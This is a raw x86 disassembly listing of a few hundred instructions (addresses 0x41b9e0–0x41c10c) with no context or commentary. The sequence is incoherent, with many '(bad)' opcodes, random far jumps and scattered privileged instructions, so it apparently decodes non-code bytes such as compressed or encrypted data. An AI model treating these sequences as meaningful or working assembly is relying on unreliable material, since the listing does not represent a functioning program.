  41b9e0:	add    ebp,DWORD PTR [esi+0x14]
  41b9e3:	(bad)  
  41b9e4:	jbe    0x41ba41
  41b9e6:	iret   
  41b9e7:	aam    0x73
  41b9e9:	adc    DWORD PTR [edi],ecx
  41b9eb:	cdq    
  41b9ec:	xchg   ebx,eax
  41b9ed:	mov    dh,0xe3
  41b9ef:	bound  ebx,QWORD PTR [ebp+0x53baa869]
  41b9f5:	or     DWORD PTR [esi+0x48be750b],ebx
  41b9fb:	jp     0x41b9bb
  41b9fd:	jecxz  0x41ba76
  41b9ff:	sbb    dh,BYTE PTR [edx-0x78]
  41ba02:	(bad)  [edi+0x70]
  41ba05:	stos   BYTE PTR es:[edi],al
  41ba06:	mov    dl,BYTE PTR [esi]
  41ba08:	push   ebx
  41ba09:	cmp    al,0x3e
  41ba0b:	loopne 0x41ba79
  41ba0d:	not    DWORD PTR [esi]
  41ba0f:	jmp    0xa4857559
  41ba14:	loope  0x41b9d5
  41ba16:	mov    BYTE PTR ds:0x1866403d,ah
  41ba1c:	add    bh,al
  41ba1e:	adc    edx,DWORD PTR [edi]
  41ba20:	mov    ds,WORD PTR [esi+edi*1-0x7]
  41ba24:	xchg   edi,eax
  41ba25:	sar    BYTE PTR [ebp-0x634e9f46],cl
  41ba2b:	and    DWORD PTR [edx],ebx
  41ba2d:	shr    BYTE PTR [edi+0x64],1
  41ba30:	pop    ds
  41ba31:	and    ch,cl
  41ba33:	jg     0x41b9bb
  41ba35:	loopne 0x41ba86
  41ba37:	stos   DWORD PTR es:[edi],eax
  41ba38:	jmp    0xbec4:0x24ced024
  41ba3f:	call   DWORD PTR ds:0x21dbdb8b
  41ba45:	xchg   si,ax
  41ba47:	out    0x12,al
  41ba49:	rcr    esp,1
  41ba4b:	shl    BYTE PTR [edx+0x6d],cl
  41ba4e:	shr    DWORD PTR [edx],0x1f
  41ba51:	test   al,0x76
  41ba53:	adc    BYTE PTR [esi],0x6c
  41ba56:	cmp    eax,esp
  41ba58:	sbb    BYTE PTR [edi-0x79fa32f8],cl
  41ba5e:	es mov edx,0xe78b17a5
  41ba64:	int    0xe3
  41ba66:	pop    ecx
  41ba67:	icebp  
  41ba68:	cmp    dl,dh
  41ba6a:	push   ds
  41ba6b:	dec    esi
  41ba6c:	shl    BYTE PTR [edi-0x1e],0xd3
  41ba70:	jg     0x41ba00
  41ba72:	lods   eax,DWORD PTR ds:[esi]
  41ba73:	das    
  41ba74:	mov    edi,0x28d173c0
  41ba79:	dec    ebp
  41ba7a:	mov    ebp,0x7450830c
  41ba7f:	icebp  
  41ba80:	add    al,0x69
  41ba82:	jne    0x41ba84
  41ba84:	mov    esi,0xd45dda8e
  41ba89:	xchg   edx,eax
  41ba8a:	sbb    ah,ah
  41ba8c:	xor    DWORD PTR [ebx+0x5a],0xcd07b08e
  41ba93:	mov    bh,0xca
  41ba95:	ins    DWORD PTR es:[edi],dx
  41ba96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba97:	leave  
  41ba98:	xchg   edx,eax
  41ba99:	xor    edx,DWORD PTR [ebp+esi*8+0xd]
  41ba9d:	aas    
  41ba9e:	imul   eax,edi,0x59
  41baa1:	shr    BYTE PTR [edi],0xdd
  41baa4:	ss ror dh,cl
  41baa7:	sub    ecx,DWORD PTR gs:[edx+0x63afa33f]
  41baae:	xchg   ecx,eax
  41baaf:	pop    edi
  41bab0:	mov    bl,0xc8
  41bab2:	je     0x41bae4
  41bab4:	cmp    ebx,DWORD PTR ds:0x56638002
  41baba:	ror    ah,cl
  41babc:	(bad)  ds:[eax]
  41babf:	push   es
  41bac0:	push   0x5b
  41bac2:	bound  edi,QWORD PTR [edx-0x63]
  41bac5:	mov    ds,edi
  41bac7:	fld    TBYTE PTR ds:0xc50c457f
  41bacd:	adc    edi,esi
  41bacf:	call   0xb008:0xc3efa26f
  41bad6:	rcl    edi,1
  41bad8:	mov    eax,ds:0x87b0af12
  41badd:	mov    esi,0x34e36b67
  41bae2:	pusha  
  41bae3:	sbb    al,0x5c
  41bae5:	sbb    ebp,DWORD PTR [edx]
  41bae7:	cld    
  41bae8:	clc    
  41bae9:	cwd    
  41baeb:	jp     0x41ba8b
  41baed:	inc    eax
  41baee:	pop    ecx
  41baef:	xchg   ebp,eax
  41baf0:	mov    al,0x2b
  41baf2:	lahf   
  41baf3:	hlt    
  41baf4:	sub    dh,BYTE PTR [edi+0x2fc6375]
  41bafa:	mov    ch,0x38
  41bafc:	jp     0x41bb13
  41bafe:	lds    esi,FWORD PTR [eax+ecx*8]
  41bb01:	loop   0x41bacd
  41bb03:	popf   
  41bb04:	jle    0x41bac6
  41bb06:	das    
  41bb07:	repz je 0x41bb02
  41bb0a:	data16 xrelease mov BYTE PTR [ebp-0x10ec07a],dh
  41bb12:	mov    DWORD PTR [esp+eax*2-0x4f3801e6],ebx
  41bb19:	ja     0x41bb88
  41bb1b:	inc    ebp
  41bb1c:	xor    BYTE PTR [ebx+ebp*8-0xb3b1ec9],ch
  41bb23:	in     eax,0x5
  41bb25:	imul   esp,ebp,0xffffff92
  41bb28:	rcl    BYTE PTR ds:0x49424220,0x1e
  41bb2f:	inc    edx
  41bb30:	push   eax
  41bb31:	ret    0xdec
  41bb34:	mov    bh,BYTE PTR [ebp-0x6c1528ea]
  41bb3a:	pushf  
  41bb3b:	push   edx
  41bb3c:	xchg   esp,eax
  41bb3d:	fdivr  QWORD PTR [ebx+0x4e]
  41bb40:	sub    al,0xa3
  41bb42:	imul   ebx,DWORD PTR [ebp-0x49],0xffffffd4
  41bb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb47:	retf   
  41bb48:	lods   eax,DWORD PTR ds:[esi]
  41bb49:	lock mov edx,0x6b7e3c15
  41bb4f:	or     bh,0x7a
  41bb52:	jae    0x41bb31
  41bb54:	data16 icebp 
  41bb56:	pop    ebx
  41bb57:	sub    al,0x63
  41bb59:	jecxz  0x41bbbc
  41bb5b:	sti    
  41bb5c:	push   esp
  41bb5e:	jbe    0x41bb05
  41bb60:	stos   DWORD PTR es:[edi],eax
  41bb61:	repz aas 
  41bb63:	pop    ss
  41bb64:	fwait
  41bb65:	out    0xa9,eax
  41bb67:	push   ebx
  41bb68:	dec    ebx
  41bb69:	and    al,0xcd
  41bb6b:	es xchg ebp,eax
  41bb6d:	int    0xa3
  41bb6f:	or     al,0x8b
  41bb71:	sbb    esp,DWORD PTR [edx]
  41bb73:	adc    al,0xb4
  41bb75:	adc    al,0x53
  41bb77:	mov    esi,0xc7cf5e7
  41bb7c:	mov    ecx,0x87002829
  41bb81:	and    DWORD PTR [ebp+edx*8-0x5d],0xf0dc7257
  41bb89:	shr    DWORD PTR [ecx-0x32],0x28
  41bb8d:	out    dx,al
  41bb8e:	jmp    0x41bb1d
  41bb90:	lock je 0x41bbfa
  41bb93:	stc    
  41bb94:	enter  0x3c61,0x3c
  41bb98:	loopne 0x41bc08
  41bb9a:	shl    DWORD PTR [ecx],0xae
  41bb9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb9e:	pop    edx
  41bb9f:	jp     0x41bbba
  41bba1:	call   0x8c96:0x9deb5531
  41bba8:	push   edi
  41bba9:	jo     0x41bbe6
  41bbab:	imul   edi,DWORD PTR fs:[edx+esi*1+0x61],0x76
  41bbb1:	or     eax,0xf80e7235
  41bbb6:	pop    ds
  41bbb7:	mov    ds:0x1df1e344,al
  41bbbc:	daa    
  41bbbd:	push   0x19
  41bbbf:	mov    ah,0x14
  41bbc1:	cs shr ebx,0xe5
  41bbc5:	sbb    cl,BYTE PTR [esi-0x2b]
  41bbc8:	mov    eax,0x61e2f80e
  41bbcd:	lahf   
  41bbce:	shr    DWORD PTR [ecx+0x56],1
  41bbd1:	ja     0x41bb5f
  41bbd3:	mov    al,0x28
  41bbd5:	pop    ebx
  41bbd6:	mov    eax,0x58b3665e
  41bbdb:	inc    esi
  41bbdc:	pop    esp
  41bbdd:	repnz add BYTE PTR [ebx+ecx*1],bl
  41bbe1:	lds    ebx,FWORD PTR [eax-0x20]
  41bbe4:	sbb    edx,esi
  41bbe6:	jp     0x41bb9c
  41bbe8:	adc    ebp,DWORD PTR [ebp+0x98b56b1]
  41bbee:	sahf   
  41bbef:	push   eax
  41bbf0:	mov    dh,0x7
  41bbf2:	pop    es
  41bbf3:	mov    al,0x3d
  41bbf5:	loop   0x41bb8f
  41bbf7:	xor    ebx,ebp
  41bbf9:	inc    edx
  41bbfa:	sbb    eax,0x57c67eee
  41bbff:	sub    dh,BYTE PTR [ebp+0x6b]
  41bc02:	repnz fwait
  41bc04:	xlat   BYTE PTR ds:[ebx]
  41bc05:	mov    cl,0xfd
  41bc07:	xchg   ebx,eax
  41bc08:	xor    dl,ah
  41bc0a:	and    BYTE PTR [ebp-0x688f44b3],bl
  41bc10:	dec    esi
  41bc11:	jo     0x41bbb8
  41bc13:	dec    eax
  41bc14:	mov    DWORD PTR [eax+0x35fc484b],ebp
  41bc1a:	ss jo  0x41bc36
  41bc1d:	cmp    cl,BYTE PTR [ebx]
  41bc1f:	test   al,0x4
  41bc21:	or     ah,0x96
  41bc24:	fdivp  st(2),st
  41bc26:	sbb    al,0x38
  41bc28:	test   ebx,ebx
  41bc2a:	push   edi
  41bc2b:	fild   QWORD PTR [edx+0x4f]
  41bc2e:	lods   eax,DWORD PTR ds:[esi]
  41bc2f:	inc    ebx
  41bc30:	push   edi
  41bc31:	mov    ebx,0x69df19d0
  41bc36:	scas   al,BYTE PTR es:[edi]
  41bc37:	nop
  41bc38:	xor    ebp,DWORD PTR [esi]
  41bc3a:	neg    ecx
  41bc3c:	adc    ecx,DWORD PTR [edi-0x5d]
  41bc3f:	pop    esp
  41bc40:	rcr    esi,1
  41bc42:	push   0x59ba149
  41bc47:	test   esi,edi
  41bc49:	sub    DWORD PTR [ecx],ebx
  41bc4b:	xlat   BYTE PTR ds:[ebx]
  41bc4c:	ins    BYTE PTR es:[edi],dx
  41bc4d:	iret   
  41bc4e:	cmp    al,cl
  41bc50:	push   ebp
  41bc51:	outs   dx,DWORD PTR ds:[esi]
  41bc52:	push   ds
  41bc53:	dec    ecx
  41bc54:	jnp    0x41bc7f
  41bc56:	jp     0x41bc28
  41bc58:	sub    ebx,ebx
  41bc5a:	jb     0x41bc0d
  41bc5c:	mov    BYTE PTR [esi],ch
  41bc5e:	outs   dx,DWORD PTR ds:[esi]
  41bc5f:	das    
  41bc60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc61:	je     0x41bcac
  41bc63:	fdivr  DWORD PTR [esi]
  41bc65:	or     BYTE PTR [edx],al
  41bc67:	jo     0x41bc04
  41bc69:	xchg   BYTE PTR [esi+ebx*8-0x46],bh
  41bc6d:	sbb    eax,0x36a1e265
  41bc72:	cmp    bh,ch
  41bc74:	pop    esp
  41bc75:	stos   BYTE PTR es:[edi],al
  41bc76:	cwde   
  41bc77:	je     0x41bc76
  41bc79:	fbstp  TBYTE PTR [esi+ecx*8]
  41bc7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc7d:	rol    BYTE PTR [ecx+0x1b0a5bdf],1
  41bc83:	arpl   sp,dx
  41bc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc86:	retf   0x12f4
  41bc89:	sbb    DWORD PTR [ebx-0x2],esi
  41bc8c:	lods   al,BYTE PTR ds:[esi]
  41bc8d:	lods   eax,DWORD PTR ds:[esi]
  41bc8e:	sub    esi,DWORD PTR [ecx+0x78c58c2e]
  41bc94:	xchg   edx,eax
  41bc95:	in     al,0xd9
  41bc97:	test   BYTE PTR [edi],bl
  41bc99:	mov    WORD PTR [esi-0x241b8b5d],?
  41bc9f:	shl    ecx,0x4c
  41bca2:	mov    cx,WORD PTR [edi+0x3f]
  41bca6:	in     eax,0x7
  41bca8:	outs   dx,BYTE PTR ds:[esi]
  41bca9:	mov    dh,0x36
  41bcab:	dec    ecx
  41bcac:	lods   eax,DWORD PTR ds:[esi]
  41bcad:	and    eax,0xa4af2730
  41bcb2:	mov    esp,edi
  41bcb4:	imul   ch
  41bcb6:	cmp    edx,edi
  41bcb8:	fcmovnu st,st(3)
  41bcba:	sub    DWORD PTR [edx-0x68],eax
  41bcbd:	ret    
  41bcbe:	sti    
  41bcbf:	aad    0xaf
  41bcc1:	pusha  
  41bcc2:	call   FWORD PTR [ecx]
  41bcc4:	sub    ebp,DWORD PTR [eax+0x2a]
  41bcc7:	mov    dl,0x1c
  41bcc9:	lods   eax,DWORD PTR ds:[esi]
  41bcca:	mov    BYTE PTR [ebp-0x33],al
  41bccd:	adc    esi,DWORD PTR [ebp+ebx*8+0x35b5b2cb]
  41bcd4:	scas   eax,DWORD PTR es:[edi]
  41bcd5:	clc    
  41bcd6:	nop
  41bcd7:	jmp    0x41bd07
  41bcd9:	and    BYTE PTR [ecx+edi*8],al
  41bcdc:	push   ecx
  41bcdd:	call   0xaa8fac45
  41bce2:	push   esi
  41bce3:	mov    bl,0x55
  41bce5:	fild   WORD PTR [ecx+eiz*2]
  41bce8:	sar    DWORD PTR [eax+ebp*4],cl
  41bceb:	push   ebx
  41bcec:	mov    ch,0x1
  41bcee:	and    BYTE PTR [eax-0x44],0xc7
  41bcf2:	jle    0x41bc7c
  41bcf4:	pop    ecx
  41bcf5:	pusha  
  41bcf6:	pusha  
  41bcf7:	mov    ds:0x467af3b6,eax
  41bcfc:	xchg   edi,eax
  41bcfd:	call   DWORD PTR [edx-0x1b632a9f]
  41bd03:	inc    edi
  41bd04:	push   eax
  41bd05:	cmp    dl,ch
  41bd07:	test   BYTE PTR [ebx-0x6c],cl
  41bd0a:	shr    DWORD PTR [esi+0x7e],cl
  41bd0d:	aas    
  41bd0e:	jp     0x41bd58
  41bd10:	fstp   QWORD PTR [esi+0x7b]
  41bd13:	sbb    eax,DWORD PTR [edi-0x3]
  41bd16:	mov    ds:0x892d48d0,al
  41bd1b:	mov    esi,0xd2e304b6
  41bd20:	ret    0xa162
  41bd23:	mov    dl,0x99
  41bd25:	add    ebp,DWORD PTR ds:[esi+0x1ccadedf]
  41bd2c:	je     0x41bd0c
  41bd2e:	lods   eax,DWORD PTR ds:[esi]
  41bd2f:	adc    dh,dl
  41bd31:	ds dec ebp
  41bd33:	stos   DWORD PTR es:[edi],eax
  41bd34:	push   es
  41bd35:	(bad)  
  41bd36:	iret   
  41bd37:	dec    ebx
  41bd38:	and    DWORD PTR [eax+0x57cbfd2a],ebx
  41bd3e:	pop    esi
  41bd3f:	xchg   ebx,eax
  41bd40:	ss ins DWORD PTR es:[edi],dx
  41bd42:	shr    BYTE PTR [ecx-0x2d],1
  41bd45:	out    0xdb,al
  41bd47:	mov    edi,0x39c4236a
  41bd4c:	push   esp
  41bd4d:	push   esi
  41bd4e:	in     al,0x4
  41bd50:	out    0x8b,eax
  41bd52:	loopne 0x41bd98
  41bd54:	test   DWORD PTR [edi-0x2a262bea],ebp
  41bd5a:	mov    eax,0xf36c6eac
  41bd5f:	and    eax,0xf1a0a0ca
  41bd64:	jg     0x41bd8c
  41bd66:	push   0x19
  41bd68:	int    0x11
  41bd6a:	push   ecx
  41bd6b:	inc    ebx
  41bd6c:	rcl    BYTE PTR [eax-0x6a],1
  41bd6f:	dec    esp
  41bd70:	rcr    eax,0x3a
  41bd73:	test   al,0xae
  41bd75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd76:	mov    dh,0x6d
  41bd78:	iret   
  41bd79:	cwde   
  41bd7a:	add    dh,dh
  41bd7c:	push   ebp
  41bd7d:	add    al,0xd9
  41bd7f:	dec    ecx
  41bd80:	jno    0x41bd84
  41bd82:	mov    al,ds:0x3ce34e33
  41bd87:	lock in al,dx
  41bd89:	xchg   ebx,eax
  41bd8a:	or     BYTE PTR [ebx+0x12],ah
  41bd8d:	jb     0x41bd48
  41bd8f:	mov    BYTE PTR [edi+0x56f24c7f],cl
  41bd95:	add    al,0x5a
  41bd97:	stos   BYTE PTR es:[edi],al
  41bd98:	xchg   edi,eax
  41bd99:	push   esi
  41bd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd9b:	jmp    0x41bddc
  41bd9d:	ja     0x41bdbe
  41bd9f:	loopne 0x41bdee
  41bda1:	mov    eax,ds:0xd0469753
  41bda6:	or     bh,BYTE PTR [edi+0x39]
  41bda9:	repz sub BYTE PTR [edi-0x7537f751],ah
  41bdb0:	ret    0xf143
  41bdb3:	push   0x4a
  41bdb5:	in     al,dx
  41bdb6:	out    dx,eax
  41bdb7:	pop    eax
  41bdb8:	mov    eax,0x605f4fe
  41bdbd:	push   0xffffffd4
  41bdbf:	mov    ecx,0x3ccd67c4
  41bdc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdc5:	cli    
  41bdc6:	pop    edx
  41bdc7:	push   ecx
  41bdc8:	cwde   
  41bdc9:	push   ebp
  41bdca:	loopne 0x41bdb7
  41bdcc:	scas   al,BYTE PTR es:[edi]
  41bdcd:	pushf  
  41bdce:	mov    dl,0x74
  41bdd0:	or     BYTE PTR [esi],dh
  41bdd2:	sbb    DWORD PTR [ecx-0x43336c05],ebp
  41bdd8:	jmp    0xd094:0x8b7e4fb1
  41bddf:	xchg   edx,eax
  41bde0:	dec    ebx
  41bde1:	push   edi
  41bde2:	mov    DWORD PTR [edx],esi
  41bde4:	or     DWORD PTR [ecx],esi
  41bde6:	jmp    0x1be7:0x1b3dbfcb
  41bded:	mov    ds:0xa76d82ae,eax
  41bdf2:	cmp    al,0x57
  41bdf4:	add    DWORD PTR [eax-0x7],esp
  41bdf7:	stos   BYTE PTR es:[edi],al
  41bdf8:	adc    eax,0xe93f0d03
  41bdfd:	in     al,0x20
  41bdff:	loope  0x41be39
  41be01:	out    0xb9,eax
  41be03:	sub    ebp,edi
  41be05:	stos   BYTE PTR es:[edi],al
  41be06:	repz mov cl,0xc
  41be09:	loope  0x41bd9c
  41be0b:	pop    ebx
  41be0c:	jbe    0x41be35
  41be0e:	push   cs
  41be0f:	popa   
  41be10:	fisttp WORD PTR [eax]
  41be12:	dec    ecx
  41be13:	add    cl,dl
  41be15:	nop
  41be16:	xor    eax,DWORD PTR [ecx-0x4c30253f]
  41be1c:	(bad)  [edi-0x38dafa37]
  41be22:	shr    BYTE PTR [esi-0x43],1
  41be25:	call   0x412f:0x61d04c68
  41be2c:	jmp    0xe137:0x1a128c74
  41be33:	gs mov ebp,0xa4043bc9
  41be39:	cs mov esp,0xc669e7a
  41be3f:	adc    BYTE PTR [edi-0x28],0xbe
  41be43:	test   ecx,ebp
  41be45:	lds    ebp,FWORD PTR ss:[edi+0x6c]
  41be49:	add    ah,BYTE PTR [edi]
  41be4b:	mov    dl,0x8e
  41be4d:	out    dx,al
  41be4e:	mov    dh,0xd1
  41be50:	cwde   
  41be51:	jbe    0x41be06
  41be53:	push   esp
  41be54:	cmp    bh,BYTE PTR [edx+eiz*4+0xb]
  41be58:	fdivr  QWORD PTR [ebx+eax*1+0x38ed7ad4]
  41be5f:	jns    0x41be39
  41be61:	jmp    0x2743:0xe309371c
  41be68:	mov    bh,0xee
  41be6a:	popa   
  41be6b:	lea    ebx,[ebx-0x32]
  41be6e:	inc    ebx
  41be6f:	and    eax,0xececa0b7
  41be74:	fisubr WORD PTR [edi]
  41be76:	sti    
  41be77:	inc    eax
  41be78:	cmp    eax,DWORD PTR [esi]
  41be7a:	pushf  
  41be7b:	aaa    
  41be7c:	stos   DWORD PTR es:[edi],eax
  41be7d:	xchg   ebp,eax
  41be7e:	addr16 or al,0xd9
  41be81:	mov    ebp,0x1260030f
  41be86:	js     0x41be92
  41be88:	in     eax,0x67
  41be8a:	stos   BYTE PTR es:[edi],al
  41be8b:	fiadd  DWORD PTR [ebx]
  41be8d:	out    0x31,eax
  41be8f:	jb     0x41be59
  41be91:	cmp    BYTE PTR [ebx],al
  41be93:	dec    eax
  41be94:	ins    DWORD PTR es:[edi],dx
  41be95:	push   ebx
  41be96:	lea    esi,[ebx]
  41be98:	sbb    BYTE PTR [ebx],0xc6
  41be9b:	inc    eax
  41be9c:	inc    esi
  41be9d:	or     DWORD PTR [edx+eax*1-0x1f7e0edb],0x9cbc3dd9
  41bea8:	cmp    DWORD PTR [eax],ecx
  41beaa:	or     BYTE PTR [ebx],0xdf
  41bead:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41beaf:	mov    ds:0x34d3fed7,al
  41beb4:	xlat   BYTE PTR ds:[ebx]
  41beb5:	mov    ah,0xdd
  41beb7:	and    esi,DWORD PTR ds:0xb7933825
  41bebd:	and    esi,DWORD PTR [edx+0x23]
  41bec0:	retf   
  41bec1:	jbe    0x41bf3a
  41bec3:	jns    0x41bec7
  41bec5:	les    ebx,FWORD PTR [ebx+edx*8]
  41bec8:	dec    esi
  41bec9:	outs   dx,BYTE PTR ds:[esi]
  41beca:	mov    DWORD PTR [edx],0x8937365e
  41bed0:	test   DWORD PTR [eax],0x7b82baa5
  41bed6:	ret    0x835c
  41bed9:	jbe    0x41beb6
  41bedb:	sbb    eax,0x9ac695b8
  41bee0:	cmp    DWORD PTR [esp+esi*8],edi
  41bee3:	mov    esp,0xde2cd38
  41bee8:	add    al,0xa0
  41beea:	jbe    0x41be9e
  41beec:	arpl   sp,bx
  41beee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beef:	shl    BYTE PTR [edx+0x3367b1f6],0x66
  41bef6:	mov    ecx,0x7a55264a
  41befb:	xlat   BYTE PTR ds:[ebx]
  41befc:	div    ebp
  41befe:	sar    BYTE PTR [eax],0x60
  41bf01:	jmp    0x41bed6
  41bf03:	mov    eax,0x6889dfcc
  41bf08:	mov    ah,0xac
  41bf0a:	repz lock pop ss
  41bf0d:	ret    
  41bf0e:	lds    ecx,FWORD PTR [eax]
  41bf10:	and    ch,ch
  41bf12:	push   0xffffffdb
  41bf14:	loope  0x41bf23
  41bf16:	jmp    0x52ae:0xcff06be7
  41bf1d:	or     BYTE PTR [esp+edx*8+0x6c],dh
  41bf21:	push   eax
  41bf22:	mov    ds:0xc64564ab,eax
  41bf27:	sbb    DWORD PTR [ecx],edi
  41bf29:	arpl   WORD PTR [ebp+0x19acaaf3],di
  41bf2f:	imul   esi,ecx,0x8b9639f6
  41bf35:	loop   0x41bf33
  41bf37:	inc    eax
  41bf38:	jle    0x41bf69
  41bf3a:	adc    al,0x3d
  41bf3c:	arpl   WORD PTR [eax],cx
  41bf3e:	push   ecx
  41bf3f:	jp     0x41bf30
  41bf41:	jp     0x41bf22
  41bf43:	adc    DWORD PTR fs:[edx],ebp
  41bf46:	inc    ebx
  41bf47:	daa    
  41bf48:	bound  esi,QWORD PTR [ebx]
  41bf4a:	cmp    ecx,DWORD PTR [eax-0x1f]
  41bf4d:	lahf   
  41bf4e:	hlt    
  41bf4f:	adc    eax,0xc4b5da67
  41bf54:	xor    DWORD PTR [ebp+0x5009440b],0x20
  41bf5b:	or     DWORD PTR [ecx],ebx
  41bf5d:	cmp    al,0xe7
  41bf5f:	or     esi,DWORD PTR [ecx+0x400b1939]
  41bf65:	pop    esp
  41bf66:	push   esp
  41bf67:	sub    eax,DWORD PTR [eax]
  41bf69:	jmp    DWORD PTR cs:[esi+0x27]
  41bf6d:	(bad)  
  41bf6e:	ins    BYTE PTR es:[edi],dx
  41bf6f:	xchg   esi,eax
  41bf70:	cmp    BYTE PTR [ebp+0x17],dl
  41bf73:	jnp    0x41bf16
  41bf75:	jo     0x41bfd5
  41bf77:	pop    ds
  41bf78:	ror    bh,0xa4
  41bf7b:	push   edx
  41bf7c:	stos   BYTE PTR es:[edi],al
  41bf7d:	popa   
  41bf7e:	mov    ch,0xd8
  41bf80:	inc    ebp
  41bf81:	call   0x2e5c2ce1
  41bf86:	sbb    BYTE PTR [esp+ecx*1-0x184111f2],dh
  41bf8d:	push   edi
  41bf8e:	imul   eax,esi,0xffffff8f
  41bf91:	mov    ?,WORD PTR [ebp-0x30bb9f4d]
  41bf97:	inc    ecx
  41bf98:	jle    0x41bf6e
  41bf9a:	xor    ebp,esi
  41bf9c:	dec    ecx
  41bf9d:	shl    BYTE PTR [esi-0x7c],0x27
  41bfa1:	test   DWORD PTR ds:0xdbff60e0,edi
  41bfa7:	sbb    DWORD PTR [ebp+0x6b227f72],edi
  41bfad:	add    eax,0x61c24c1f
  41bfb2:	inc    edx
  41bfb3:	pop    ebx
  41bfb4:	rcr    DWORD PTR [ecx],0xc1
  41bfb7:	ss mov ebp,0x9b02996d
  41bfbd:	mov    bl,0xf3
  41bfbf:	es inc ecx
  41bfc1:	cli    
  41bfc2:	test   BYTE PTR [edx+ecx*1-0x3f],bh
  41bfc6:	mov    ch,0x16
  41bfc8:	cmp    esi,esp
  41bfca:	pushf  
  41bfcb:	sbb    esp,DWORD PTR ss:[edi-0x3a9bf078]
  41bfd2:	xor    ch,ah
  41bfd4:	jns    0x41bf57
  41bfd6:	mov    BYTE PTR [ebx-0x4b2b7680],0xbb
  41bfdd:	jbe    0x41c02a
  41bfdf:	mov    edx,0x966d4248
  41bfe4:	mov    edi,0xff899673
  41bfe9:	ja     0x41c035
  41bfeb:	and    ecx,0x37
  41bfee:	sbb    al,BYTE PTR [eax-0x53]
  41bff1:	add    BYTE PTR [ebx+0x4],0x95
  41bff5:	test   eax,0x56a2a12a
  41bffa:	push   esi
  41bffb:	aad    0xca
  41bffd:	cmp    eax,esi
  41bfff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c000:	lahf   
  41c001:	stc    
  41c002:	loope  0x41bf94
  41c004:	scas   al,BYTE PTR es:[edi]
  41c005:	inc    ecx
  41c006:	xchg   ecx,eax
  41c007:	test   eax,0x95f291ae
  41c00c:	inc    ebx
  41c00d:	and    ch,bh
  41c00f:	stc    
  41c010:	xchg   esi,eax
  41c011:	fcom   QWORD PTR es:0x976c55ba
  41c018:	loope  0x41bfc6
  41c01a:	push   ss
  41c01b:	das    
  41c01c:	jle    0x41c084
  41c01e:	xchg   DWORD PTR [ebx-0x5e3ab6f6],ebp
  41c024:	iret   
  41c025:	mov    dh,0x25
  41c027:	arpl   WORD PTR [ebx],bp
  41c029:	push   esp
  41c02a:	mov    ecx,0x2a52abbc
  41c02f:	jp     0x41c012
  41c031:	cwde   
  41c032:	in     eax,0x8b
  41c034:	test   al,0x5
  41c036:	push   0xb02a6d5f
  41c03b:	push   ebx
  41c03c:	scas   al,BYTE PTR es:[edi]
  41c03d:	les    eax,FWORD PTR [ecx+0x6b]
  41c040:	mov    ch,0xaa
  41c042:	xor    al,0x13
  41c044:	xchg   ebp,eax
  41c045:	mov    al,ds:0xce7da50d
  41c04a:	jmp    0x164c0abc
  41c04f:	xchg   edi,eax
  41c050:	fcmovnbe st,st(0)
  41c052:	or     BYTE PTR [edx+0x67ef53e4],bh
  41c058:	push   edi
  41c059:	add    BYTE PTR [ebp-0x4007269],cl
  41c05f:	dec    ebp
  41c060:	leave  
  41c061:	imul   ebp,DWORD PTR [edx],0x7
  41c064:	pop    ebx
  41c065:	pop    ebx
  41c066:	int    0x3f
  41c068:	sbb    ch,BYTE PTR [ebx]
  41c06a:	daa    
  41c06b:	test   al,0x87
  41c06d:	ins    BYTE PTR es:[edi],dx
  41c06e:	stc    
  41c06f:	mov    eax,ds:0xb93c99e5
  41c074:	mov    bl,0xb9
  41c076:	jmp    FWORD PTR [edx]
  41c078:	inc    esp
  41c079:	push   0xffffff91
  41c07b:	push   edx
  41c07c:	bound  esp,QWORD PTR [ecx+esi*2]
  41c07f:	mov    dh,0xc
  41c081:	push   es
  41c082:	outs   dx,BYTE PTR ds:[esi]
  41c083:	mov    bl,0x28
  41c085:	pop    eax
  41c086:	jmp    0x41c06d
  41c088:	in     al,0x2f
  41c08a:	jl     0x41c0ec
  41c08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08d:	jmp    0x6ab20ab9
  41c092:	push   esp
  41c093:	add    dl,cl
  41c095:	mov    bh,0x27
  41c097:	stos   BYTE PTR es:[edi],al
  41c098:	cmp    edx,ebx
  41c09a:	xchg   esi,eax
  41c09b:	imul   DWORD PTR [ecx+esi*2]
  41c09e:	mov    ds:0xb8923f0c,eax
  41c0a3:	cdq    
  41c0a4:	ins    DWORD PTR es:[edi],dx
  41c0a5:	push   ebp
  41c0a6:	mov    al,0x99
  41c0a8:	push   eax
  41c0a9:	pop    ecx
  41c0aa:	(bad)
  41c0ae:	inc    esp
  41c0af:	sub    ch,bl
  41c0b1:	add    al,0xa5
  41c0b3:	jne    0x41c0b1
  41c0b5:	call   0x9d65:0x1e266875
  41c0bc:	mov    esp,0xf94550f3
  41c0c1:	sbb    ecx,DWORD PTR [edi]
  41c0c3:	ds jmp 0x41c05a
  41c0c6:	dec    ebx
  41c0c7:	repz mov dl,0xe5
  41c0ca:	inc    esp
  41c0cb:	call   0x94b9:0xff72046b
  41c0d2:	jp     0x41c0c3
  41c0d4:	(bad)  
  41c0d5:	mov    ebp,0x44cb5b16
  41c0da:	in     al,dx
  41c0db:	imul   eax,esp,0xdc2b66e2
  41c0e1:	leave  
  41c0e2:	jne    0x41c11b
  41c0e4:	cmp    DWORD PTR [ebp-0x797aded5],ebp
  41c0ea:	xor    DWORD PTR ds:0x29e5716c,ecx
  41c0f0:	repz sub al,0xad
  41c0f3:	sbb    esp,DWORD PTR [ecx-0x2e]
  41c0f6:	call   0x63ae:0xcddbb0c7
  41c0fd:	or     eax,0x274af062
  41c102:	or     BYTE PTR [edx-0x64],al
  41c105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c106:	sbb    BYTE PTR [esi+0x776aa1e7],bh
  41c10c:	pushf  
